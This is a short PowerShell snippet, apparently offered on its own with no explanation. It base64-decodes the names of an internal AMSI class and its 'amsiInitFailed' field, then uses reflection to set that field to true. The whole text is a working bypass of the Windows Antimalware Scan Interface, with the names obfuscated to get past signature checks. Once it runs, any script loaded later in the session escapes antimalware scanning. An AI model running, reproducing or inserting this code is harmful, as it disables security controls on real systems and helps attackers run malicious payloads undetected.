$encoded = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
$a = [Ref].Assembly.GetType($decoded)
$encoded = "YW1zaUluaXRGYWlsZWQ="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
$b = $a.GetField($decoded, 'NonPublic,Static')
$b.SetValue($null, $true)